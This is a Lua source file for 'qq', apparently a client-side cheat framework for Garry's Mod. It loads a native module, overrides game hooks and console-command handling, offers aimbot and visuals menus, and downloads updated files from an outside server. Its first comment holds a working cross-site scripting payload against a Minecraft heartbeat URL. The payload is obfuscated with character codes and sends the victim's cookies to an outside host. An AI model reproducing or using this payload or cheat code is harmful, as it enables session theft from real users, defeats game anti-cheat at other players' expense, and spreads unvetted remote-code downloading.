// http://www.minecraft.net/heartbeat.jsp?port=%3Cimg%20src=%22noexist%22%20onerror=location.href=String.fromCharCode(104,116,116,112,58,47,47,99,104,97,114,108,105,101,46,98,122,47,115,104,105,116,47,109,99,97,116,116,97,99,107,46,114,104,116,109,108,63,99,61)%2Bescape(document[String.fromCharCode(99,111,111,107,105,101)])//&max=1&name=&public=True/False&version=1&salt=foo&users=0
// http://www.ebuyer.com/product/267363
if SERVER then return end

local qq = {}

package.loaded.qq = nil


local str = "LOADLIB: " .. util.RelativePathToFull("lua/includes/modules/gmcl_qq.dll")
qq.loadlibRef = _R[str]--needed

_R[str] = nil

InitToTable(qq, "this is a very very super secure key!@~?")

string.TrimLeft = function(str, ...) 
	return string.reverse(string.TrimRight(string.reverse(str), ...))--@Wizard I made that a tailcall...
end

// HTTPGet is vuln right now!
qq.DownloadFile = function(URL, Header)
	local connection = HTTPGet()
	connection:Download(URL,Header or "")
	
	debug.sethook()
	
	repeat until connection:Finished()
	return connection:GetBuffer()
end

qq.StringEndsWith = function(str, endStr)--@Wizard, major optimation
	return string.sub(str,-string.len(endStr)) == endStr
end

qq.Module.Read = function(fname)
	fname = string.TrimLeft(fname, '/')
	fname = string.TrimLeft(fname, '\\')
	if 		qq.StringEndsWith(fname, ".txt") or
			qq.StringEndsWith(fname, ".lua") or
			qq.StringEndsWith(fname, ".vmt") then
		return qq.Module.qqRead(fname)
	else
		local ret = ""
		local tbl = qq.Module.qqReadBinary(fname) or {}
		for k,v in pairs(tbl) do
			ret = ret .. tostring(v) .. "|"
		end
		file.Write("bin.txt", ret)
		return ret
	end
end

qq.Module.Write = function(fname, content)
	fname = string.TrimLeft(fname, '/')
	fname = string.TrimLeft(fname, '\\')
	local dir = ""
	for i = 1, string.len(fname) do
		local char = fname[i]
		if char == '/' or char == '\\' then
			// It is a DIR
			if not qq.Module.qqDIRExists(dir) then
				qq.Module.qqMakeDIR(dir)
			end
			dir = dir .. char
		elseif char == '.' then
			// It is a file
			break
		else
			dir = dir .. char
		end
	end
	
	if 		qq.StringEndsWith(fname, ".txt") or
			qq.StringEndsWith(fname, ".lua") or
			qq.StringEndsWith(fname, ".vmt") then
		return qq.Module.qqWrite(fname, content)
	else
		if type(content) == "table" then
			return qq.Module.qqWriteBinary(fname, content)
		else
			local currentbyte = ""
			
			if not qq.Module.qqWriteBinary(fname) then return end
			
			for i = 1, string.len(content) do
				local c = content[i]
				if c == '|' then
					qq.Module.qqWriteBinaryPut(tonumber(currentbyte))
					currentbyte = ""
				else
					currentbyte = currentbyte .. c
				end
			end
			
			qq.Module.qqWriteBinaryClose()
		end
	end
end

qq.Module.FileList = function(dir)
	fname = string.TrimLeft(fname, '/')
	fname = string.TrimLeft(fname, '\\')
	return qq.Module.qqFileList(dir)
end

qq.GlobalCopy = {}
for k,v in pairs(_G) do
	qq.GlobalCopy[k] = v
end

local concommand = concommand
local cvars = cvars
local debug = debug
local ents = ents
local file = file
local hook = hook
local math = math
local spawnmenu = spawnmenu
local string = string
local surface = surface
local table = table
local timer = timer
local util = util
local vgui = vgui

local Angle = Angle
local CreateClientConVar = CreateClientConVar
local CurTime = CurTime
local ErrorNoHalt = ErrorNoHalt
local FrameTime = FrameTime
local GetConVarString = GetConVarString
local GetViewEntity = GetViewEntity
local include = include
local ipairs = ipairs
local LocalPlayer = LocalPlayer
local pairs = pairs
local pcall = pcall
local print = print
local RunConsoleCommand = RunConsoleCommand
local ScrH = ScrH
local ScrW = ScrW
local tonumber = tonumber
local type = type
local unpack = unpack
local ValidEntity = ValidEntity
local Vector = Vector


qq.MENU_GENERIC = 0
qq.MENU_AIMBOT = 1
qq.MENU_GAMEMODE = 3
qq.MENU_DEV = 4
qq.MENU_VISUALS = 5

qq.GetMeta = function(name)
	return table.Copy(_R[name] or {})
end

qq.Meta = {}
qq.Meta.Ang = qq.GetMeta("Angle")
qq.Meta.Cmd = qq.GetMeta("CUserCmd")
qq.Meta.Ent = qq.GetMeta("Entity")
qq.Meta.Ply = qq.GetMeta("Player")
qq.Meta.Vec = qq.GetMeta("Vector")
qq.Meta.Wep = qq.GetMeta("Weapon")
qq.Meta.NPC = qq.GetMeta("NPC")
qq.Meta.Mat = qq.GetMeta("IMaterial")
qq.Meta.Tex = qq.GetMeta("ITexture")


local VecMeta = qq.Meta.Vec

local Blue = Color(0, 191, 255)
local Green = Color(30, 255, 30)
local Orange = Color(255, 165, 30)
local Red = Color(255, 30, 30)
local White = Color(255, 255, 255)

qq.Inform = function(msg, ...)
	msg = qq.Format(msg, ...)
	qq.Module.ColorMsg(Green, "[qq]")
	qq.Module.ColorMsg(Orange, "[Info]")
	qq.Module.ColorMsg(White, " " .. msg .. "\n")
end

qq.DebugMsg = function(msg, ...)
	if GetConVarNumber("developer") != 0 then
		msg = qq.Format(msg, ...)
		qq.Module.ColorMsg(Green, "[qq]")
		qq.Module.ColorMsg(White, "[Debug]")
		qq.Module.ColorMsg(Blue, " " .. msg .. "\n")
	end
end

qq.Warn = function(msg, ...)
	msg = qq.Format(msg, ...)
	qq.Module.ColorMsg(Green, "[qq]")
	qq.Module.ColorMsg(Red, "[Warn]")
	qq.Module.ColorMsg(Orange, " " .. msg .. "\n")
end

qq.Error = function(msg, ...)
	msg = qq.Format(msg, ...)
	qq.Module.ColorMsg(Green, "[qq]")
	qq.Module.ColorMsg(Red, "[Error]")
	qq.Module.ColorMsg(White, " " .. msg .. "\n")
	
	local TraceBack = debug.traceback()
	qq.Module.ColorMsg(Red, TraceBack .. "\n")
end

qq.Debug = function(msg, ...)
	if GetConVar("developer") == 0 then return end
	msg = qq.Format(msg, ...)
	qq.Module.ColorMsg(Green, "[qq]")
	qq.Module.ColorMsg(White, "[Dev]")
	qq.Module.ColorMsg(Blue, " " .. msg .. "\n")
	
	local TraceBack = debug.traceback()
	qq.Module.ColorMsg(Red, TraceBack .. "\n")
end

qq.Format = function(format, ...)
	local args = {...}
	local ret = format
	for k,v in pairs(args) do
		local arg = tostring(v)
		local key = "{" .. tostring(k) .. "}"
		ret = string.Replace(ret, key, arg)
	end
	return ret
end

qq.Inform("qq - The fastest hack in town!")

qq.Inform("Copied globals")
qq.HookTable = {}
qq.ActiveHookTable = {}
qq.OldHookCall = _G.hook.Call

_G.hook.Call = function(name, gm, ...)
	local ret = qq.CallInternalHook(name, ...)
	if ret != nil then
		return ret
	end
	return qq.OldHookCall(name, gm, ...)
end

qq.CallInternalHook = function(Name, ...)
	for k,tbl in pairs(qq.ActiveHookTable[Name] or {}) do
		local ret = nil
		if ... == nil then
			ret = tbl.Func()
		else
			ret = tbl.Func(...)
		end
		if ret != nil then // this is so we dont always return a value, EG HUDPaint should not have a return unless overidden
			return ret
		end
	end
end

qq.RegisterHook = function(Plugin, Hook, Id, Func, IsFast)
	qq.HookTable[Hook] = qq.HookTable[Hook] or {}
	
	local NewHook = {
		Plugin = Plugin,
		Id = Id,
		Hook = Hook,
		Func = Func
	}
	if not IsFast or qq.Debugging then // An extra call, we don't want to sacrifce this if we don't have to
		NewHook.Func = function(...)
			local s,ret = pcall(Func, ...)
			if not s then
				ErrorNoHalt(Plugin.Name .. " :: " .. ret .. "\n")
				return nil
			end
			return ret
		end
	end
	qq.HookTable[Hook][Id] = NewHook
end

qq.DisableHooks = function(Plugin)
	for hookname, hooktbl in pairs(qq.ActiveHookTable) do
		for id, Hook in pairs(hooktbl) do
			if Hook.Plugin == Plugin then
				qq.ActiveHookTable[hookname][id] = nil
				qq.HookTable[hookname] = qq.HookTable[hookname] or {}
				qq.HookTable[hookname][id] = Hook
			end
		end
	end
end

qq.EnableHooks = function(Plugin)
	for hookname, hooktbl in pairs(qq.HookTable) do
		for id, Hook in pairs(hooktbl) do
			if Hook.Plugin == Plugin then
				qq.HookTable[hookname][id] = nil
				qq.ActiveHookTable[hookname] = qq.ActiveHookTable[hookname] or {}
				qq.ActiveHookTable[hookname][id] = Hook
			end
		end
	end
end

qq.Commands = {}
qq.OldCmdRun = concommand.Run
concommand.Run = function( pl, name, ... )
	local tbl = qq.Commands[name]
	if tbl != nil and not tbl.Plugin then
		return tbl.Func(pl,name,...)
	elseif tbl != nil and tbl.Plugin.IsEnabled then
		return tbl.Func(pl,name,...)
	else
		return qq.OldCmdRun(pl, name, ...)
	end
end

qq.RegisterCommandNoPlugin = function(Cmd, Func, AutoCompleteFunc, HelpText)
	qq.DebugMsg("Command \"" .. Cmd .. "\" has been registered (No Plugin)")
	AddConsoleCommand(Cmd,HelpText)
	
	local NewTbl = {
		Plugin = Plugin,
		Func = Func,
		AutoCompleteFunc = AutoCompleteFunc,
		HelpText = HelpText
	}
	qq.Commands[Cmd] = NewTbl
end

qq.RegisterCommand = function(Plugin, Cmd, Func, AutoCompleteFunc, HelpText)
	local startchar = Cmd[1]
	if startchar == "+" or startchar == "-" then
		Cmd = startchar .. "qq_" .. Plugin.Alias .. "_" .. string.gsub(Cmd, startchar, "")--@Wizard replaced Replace with gsub
	else
		Cmd = "qq_" .. Plugin.Alias .. "_" .. Cmd
	end
	
	qq.DebugMsg("Command \"" .. Cmd .. "\" has been registered")
	AddConsoleCommand(Cmd,HelpText)
	
	local NewTbl = {
		Plugin = Plugin,
		Func = Func,
		AutoCompleteFunc = AutoCompleteFunc,
		HelpText = HelpText
	}
	qq.Commands[Cmd] = NewTbl
end

qq.Plugins = {}
qq.EnablePlugin = function(Plugin)
	if Plugin.CanRun and not Plugin.CanRun() then return false end
	
	qq.EnableHooks(Plugin) // We disable for performace reasons!
	
	Plugin.IsEnabled = true
	if Plugin.Enabled then Plugin.Enabled() end // Recreate any of their settings
	return true
end

qq.DisablePlugin = function(Plugin)
	qq.DisableHooks(Plugin)
	
	Plugin.IsEnabled = false
	
	for k, info in pairs(qq.Settings) do
		if info.Plugin.Alias == Plugin.Alias then
			qq.Settings[k] = nil
		end
	end
	
	for k, info in pairs(qq.SettingsOrdered) do
		if info.Plugin.Alias == Plugin.Alias then
			qq.SettingsOrdered[k] = nil
		end
	end	
	
	if Plugin.Disabled then Plugin.Disabled() end
	return true
end

qq.UnloadPlugin = function(Plugin)
	qq.DisablePlugin(Plugin)
	
	for hookname, hooktbl in pairs(qq.HookTable) do
		for id, Hook in pairs(hooktbl) do
			if Hook.Plugin == Plugin then
				qq.HookTable[hookname][id] = nil
			end
		end
	end
end

qq.InternPlugin = {
	Name = "Internal",
	Alias = "internal",
}

qq.RegisterPlugin = function(Plugin)
	qq.Plugins[Plugin.Alias] = Plugin
	
	local name = Plugin.Alias .. "_enabled"
	qq.CreateSetting(qq.MENU_DEV, qq.InternPlugin, Plugin.Alias .. "_enabled", "Enable " .. Plugin.Name, true, {Save = true}, function(name,old,new)
		if not Plugin.Loaded then return end
		if new then // If we just enabled ourselfs
			qq.Inform("Plugin {1} has been enabled", Plugin.Name)
			qq.EnablePlugin(Plugin)
		elseif not new then
			qq.Inform("Plugin {1} has been disabled", Plugin.Name)
			qq.DisablePlugin(Plugin)
		end
	end)
	
	local Enabled = qq.Setting(qq.InternPlugin, name)
	if not Enabled then
		qq.Warn("{1}({2}) is disabled!", Plugin.Name, Plugin.Alias)
	end
	
	local LPlugin = Plugin
	// For ease
	Plugin.CreateSetting = function(...)
		qq.Error("Please do not use Plugin.CreateSetting")
		local Args = {...}
		local Menu = Args[1]
		table.remove(Args, 1)
		qq.CreateSetting(Menu, LPlugin, unpack(Args))
	end
	Plugin.Setting = function(...)
		qq.Setting(LPlugin, ...)
	end
	Plugin.GetSetting = function(...)
		qq.GetSetting(LPlugin, ...)
	end
	Plugin.SetSetting = function(...)
		qq.SetSetting(LPlugin, ...)
	end
	
	if Plugin.CanRun and not Plugin.CanRun() then
		return false
	end
	
	// Register the hooks
	for hookname, func in pairs(Plugin.Hooks or {}) do
		qq.RegisterHook(Plugin, hookname, tostring(func), func, true)
	end
	//(Plugin, Cmd, Func, AutoCompleteFunc, HelpText)
	for cmd,arg in pairs(Plugin.ConCommands or {}) do
		if type(arg) == "function" then
			qq.RegisterCommand(Plugin, cmd, arg)
		else
			qq.RegisterCommand(Plugin, cmd, arg.Func, arg.AutoCompleteFunc, arg.HelpText)
		end
	end
	
	if Plugin.Init and not Plugin.Init() then end
	
	if Enabled then
		qq.EnablePlugin(Plugin)
	end
	Plugin.Loaded = true
	qq.DebugMsg("Plugin " .. Plugin.Name .. " (" .. Plugin.Alias .. ") loaded!")
end

qq.Settings = {}
qq.SettingsOrdered = {}
qq.AliasSetting = {}
qq.OldOnConVarChanged = qq.OldOnConVarChanged or cvars.OnConVarChanged
cvars.OnConVarChanged = function(name, old, new)
	qq.CallInternalHook("CVarChanged", name, old, new)
	local origname = name
	if qq.AliasSetting[name] then
		name = qq.AliasSetting[name]
	end
	if not qq.Settings[name] then return qq.OldOnConVarChanged(name, old, new) end
	local info = qq.Settings[name]
	
	if info.Type == "number" then
		new = tonumber(new)
	elseif info.Type == "boolean" then
		new = (tonumber(new) or 0) > 0
	elseif info.Type == "table" then
		local col = string.gsub(origname, name .. "_", "")
		local oldc = info.Value
		oldc[col] = tonumber(new)
		new = Color(oldc.r,oldc.g,oldc.b,oldc.a)
	end
	
	info.Value = new
	if info.Callback and type(info.Callback) == "function" then
		info.Callback(name,old,new)
	end
end

qq.FriendlySettingName = function(Plugin, SettingName)
	if type(Plugin) == "string" or not Plugin.Alias or not Plugin.Name then
		qq.Error("The supplied argument to qq.FriendlySettingName(1) is of the wrong type or is invalid!")
	end
	if not SettingName then
		qq.Error("Setting name is invalid")
	end
	return string.lower("qq_" .. Plugin.Alias .. "_" .. SettingName)
end

qq.EncodeColor = function(c)
	return 	c.r +
			c.g * 255 +
			c.b * 255 * 255
end

qq.ColorPreCache = {}
qq.DecodeColor = function(num)
	if qq.ColorPreCache[num] then
		return qq.ColorPreCache[num] // Precache, make faster!
	end
	
	local r,g,b
	r = num % 255
	g = (num - r) / 255 % 255
	b = (num - r - g * 255) / 255 / 255 % 255
		
	local col = Color(r,g,b,a)
	qq.ColorPreCache[num] = col
	return col
end

qq.CreateSetting = function(Section, Plugin, Name, Disc, Default, Args, Callback)	
	local OK = false
	if Section == nil or type(Section) != "number" then
		qq.Error("CreateSetting: Argument #1 is invalid")
	elseif Plugin == nil or type(Plugin) != "table" then
		qq.Error("CreateSetting: Argument #2 is invalid")
	elseif Name == nil or type(Name) != "string" then
		qq.Error("CreateSetting: Argument #3 is invalid")
	elseif Disc == nil or type(Disc) != "string" then
		qq.Error("CreateSetting: Argument #4 is invalid")
	elseif Default == nil then
		qq.Error("CreateSetting: Argument #5 is invalid")
	else
		if Plugin.Name and Plugin.Alias then // All is good
			OK = true
		else
			qq.Error("CreateSetting: Plugin value is invalid!")
		end
	end
	
	if not OK then
		qq.Warn("Failed to create a setting!")
		return
	end
	
	local cvar = qq.FriendlySettingName(Plugin, Name)
	local info = {
		Section = Section,
		Name = Name,
		Desc = Disc,
		CVar = cvar,
		Type = type(Default),
		Value = Default,
		Callback = Callback,
		Misc = Args,
		Plugin = Plugin
	}
	
	// Not sure what this does :( ???
	/*
	for k, v in pairs(misc or {}) do
		if not info[k] then info[k] = v end
	end
	*/
	if type(Default) == "function" then
		qq.RegisterCommandNoPlugin(cvar, Default)
		qq.Settings[cvar] = info
		info.OrderedPosition = #qq.SettingsOrdered + 1
		qq.SettingsOrdered[info.OrderedPosition] = info
	else
		if type(Default) == "table" then
			
			qq.AliasSetting[cvar .. "_r"] = cvar
			qq.AliasSetting[cvar .. "_g"] = cvar
			qq.AliasSetting[cvar .. "_b"] = cvar
			qq.AliasSetting[cvar .. "_a"] = cvar
			
			if not qq.Settings[cvar] then
				cvars.AddChangeCallback(cvar .. "_r", function() end)
				cvars.AddChangeCallback(cvar .. "_g", function() end)
				cvars.AddChangeCallback(cvar .. "_b", function() end)
				cvars.AddChangeCallback(cvar .. "_a", function() end)
			end
			
			qq.Settings[cvar] = info
			info.OrderedPosition = #qq.SettingsOrdered + 1
			qq.SettingsOrdered[info.OrderedPosition] = info
			
			CreateClientConVar(cvar .. "_r", Default.r, ((info.Misc or {}).Save != false), false)
			CreateClientConVar(cvar .. "_g", Default.g, ((info.Misc or {}).Save != false), false)
			CreateClientConVar(cvar .. "_b", Default.b, ((info.Misc or {}).Save != false), false)
			CreateClientConVar(cvar .. "_a", Default.a, ((info.Misc or {}).Save != false), false)
			
			cvars.OnConVarChanged(cvar .. "_r", "", GetConVarString(cvar .. "_r"))
			cvars.OnConVarChanged(cvar .. "_g", "", GetConVarString(cvar .. "_g"))
			cvars.OnConVarChanged(cvar .. "_b", "", GetConVarString(cvar .. "_b"))
			cvars.OnConVarChanged(cvar .. "_a", "", GetConVarString(cvar .. "_a"))
		else
			// Convert Default from boolean to number.
			if type(Default) == "boolean" then
				Default = Default and 1 or 0
			end
		
			if not qq.Settings[cvar] then
				cvars.AddChangeCallback(cvar, function() end)
			end
			
			qq.Settings[cvar] = info
			info.OrderedPosition = #qq.SettingsOrdered + 1
			qq.SettingsOrdered[info.OrderedPosition] = info
			
			// Create the convar.
			CreateClientConVar(cvar, Default, ((info.Misc or {}).Save != false), false)
			
			cvars.OnConVarChanged(cvar, "", GetConVarString(cvar))
		end
	end
end

qq.GetSetting = function(Plugin, Name)
	local cvar = qq.FriendlySettingName(Plugin, Name)
	if not qq.Settings[cvar] then return end
	return qq.Settings[cvar].Value
end
qq.Setting = qq.GetSetting

qq.SetSetting = function(Plugin, Name, Value)
	local old = qq.Setting(Plugin, Name)
	local cvar = qq.FriendlySettingName(Plugin, Name)
	
	if not qq.Settings[cvar] then return end
	local info = qq.Settings[cvar]
	//info.Value = Value
	
	local NewVal = tostring(Value)
	if type(Value) == "boolean" then
		if Value then
			NewVal = "1"
		else
			NewVal = "0"
		end
	end
	
	if Name != "preset" and Plugin.Alias != "presets" then
		RunConsoleCommand(cvar, NewVal)
		
		local PresetPlugin = qq.Plugins["presets"]
		if PresetPlugin then
			cvar = qq.FriendlySettingName(PresetPlugin, "preset")
			RunConsoleCommand(cvar, "")
		end
	end
	if info.Callback and type(info.Callback) == "function" then
		info.Callback(name,old,new)
	end
end


qq.Errors = {}

qq.Include = function(fname)
	local contents = qq.Module.Read(fname)
	qq.Module.RunString(fname, contents)
	//return pcall(CompileString(contents, fname))
end

qq.LoadPlugins = function()
	eqq = qq
	local lst = qq.Module.qqGetFileList("qq/Plugins/") //file.Find("qq/Plugins/*.lua")
	for fname, _ in pairs(lst) do
		if not string.find(fname, "~", 1, true) and fname != ".." and fname != "." then--@Wizard add ,1 ,true to disable pattern test
			local status, ret = qq.Include("qq/Plugins/" .. fname)
			/*if not status then
				qq.Warn("Failed to load plugin {1} : {2}", fname, ret)
				table.insert(qq.Errors,
				{
					Plugin = nil,
					File = fname,
					Error = ret
				})
			end*/
		end
	end
	
	local loadedplugins = table.Count(qq.Plugins)
	local settings = table.Count(qq.Settings)
	local hooks = table.Count(qq.HookTable) + table.Count(qq.ActiveHookTable)
	local cmds = table.Count(qq.Commands)
	
	qq.Inform("{1} Plugins loaded, {2} settings, {3} hooks and {4} console commands registered", loadedplugins, settings, hooks, cmds)
	
	if #qq.Errors > 0 then
		local str = qq.Format("{1} plugins have failed to load!", #qq.Errors)
		qq.Warn(str)
	end
	qq.Errors = {}
	
	eqq = nil
	qq.CallInternalHook("qqLoaded")
end


qq.Menu = nil
qq.SetMenu = function(Menu)
	qq.Inform("Menu loaded")
	qq.Menu = Menu
end

local Tabs = {}
qq.RegisterTab = function(id, name, icon, buildfunc)
	qq.Menu.RegisterTab(id, name, icon, buildfunc)
end

qq.OpenMenu = function()
	if not qq.Menu then
		ErrorNoHalt("No menu found!")
		qq.Error("No menu found!")
		return
	end
	qq.Menu.Open()
end
qq.RegisterCommandNoPlugin("qq_menu", qq.OpenMenu, nil, "Open the qq menu")

qq.Update = function(nobinary)
	local domain = "http://arb0c.net"
	qq.Inform("Checking for updates @ {1}", domain)
	local hash = GetConVarString("aah_hash")

	local info = qq.DownloadFile(domain .. "/versioninfo?hash=" .. hash)

	if not info or info == "" or info == "nope.avi" then
		qq.Warn("Hash is incorrect!")
		RunConsoleCommand("aah_login")
		return
	end

	local files = string.Explode("\n", info)

	local updated = 0
		
	for k,v in pairs(files) do
		local split = string.Explode(":",v)
		
		local fname = split[1]
		local crc = split[2]
		
		if fname == "" or qq.StringEndsWith(fname, ".dll") then continue end
		
		if nobinary then
			if qq.StringEndsWith(fname, ".vtf") then continue end
		end
		
		local contents = qq.Module.Read(fname) or ""
		local ourcrc = util.CRC(contents)
		
		if crc != ourcrc then
			if qq.StringEndsWith(fname, ".dll") then
				qq.Warn("The module {1} is out of date.  Update it now to load qq!", fname)
				qq.LoadPlugins = function() end
				continue
			end
			qq.Inform("Updating {1}", fname)
			qq.Module.Write(fname, qq.DownloadFile(domain .. fname .. "?hash=" .. hash))
			updated = updated + 1
		end
	end
	if updated > 0 then
		qq.Inform("qq updated {1} files", updated)
	else
		qq.Inform("qq is up to date!")
	end
end

qq.RegisterCommandNoPlugin("qq_update", function(cmd, pl, args)
	if args[1] then
		qq.Update()
	else
		qq.Update(true)
	end
end, nil, "Update qq")

qq.ReloadPlugins = function()
	qq.Settings = {}
	for k, v in pairs(qq.Plugins) do
		qq.UnloadPlugin(v)
	end
	qq.Inform("Using reload too many times will cause qq to slow down, and possibly crash!")
	qq.LoadPlugins()
end
qq.RegisterCommandNoPlugin("qq_reload", qq.ReloadPlugins, nil, "Reload all plugins")

qq.PrintHooks = function()
	local msg = "Active hooks:\n"	
	for hookname, tbl in pairs(qq.ActiveHookTable) do
		msg = msg .. qq.Format("{1}:\n", hookname)
		for k, v in pairs(tbl) do
			local f = debug.getinfo(v.Func).short_src
			msg = msg .. qq.Format("\t{1}({2}) @ {3}\n", v.Plugin.Name, v.Plugin.Alias, f)
		end
	end
	qq.Inform(msg)
	msg = "Inactive hooks:\n"
	for hookname, tbl in pairs(qq.HookTable) do
		msg = msg .. qq.Format("{1}:\n", hookname)
		for k, v in pairs(tbl) do
			local f = debug.getinfo(v.Func).short_src
			msg = msg .. qq.Format("\t{1}({2} @ {3}\n", v.Plugin.Name, v.Plugin.Alias, f)
		end
	end
	qq.Inform(msg)
end
qq.RegisterCommandNoPlugin("qq_printhooks", qq.PrintHooks, nil, "Print all hooks")

// Some util funcs
qq.ScreenSize = {
	x = ScrW(),
	y = ScrH()
}

qq.UpdateScreenSize = function()
	qq.ScreenSize.x = ScrW()
	qq.ScreenSize.y = ScrH()
	
	timer.Simple(60, qq.UpdateScreenSize)
end
timer.Simple(60, qq.UpdateScreenSize)

qq.NormalizeAngle = function(ang)
	return Angle(math.NormalizeAngle(ang.p), math.NormalizeAngle(ang.y), math.NormalizeAngle(ang.r))
end

qq.AngleBetween = function(a, b)
	local dot = VecMeta.Dot(a,b)
	//if not acos == acos  then // fix for some peice of shit bug in lua
	if dot > 1.0 then
		return 0
	end
	return math.deg(math.acos(dot))
end

qq.Update(true)
eqq = qq
qq.Include("qq/Menu/DefaultMenu.lua")
eqq = nil

qq.LoadPlugins()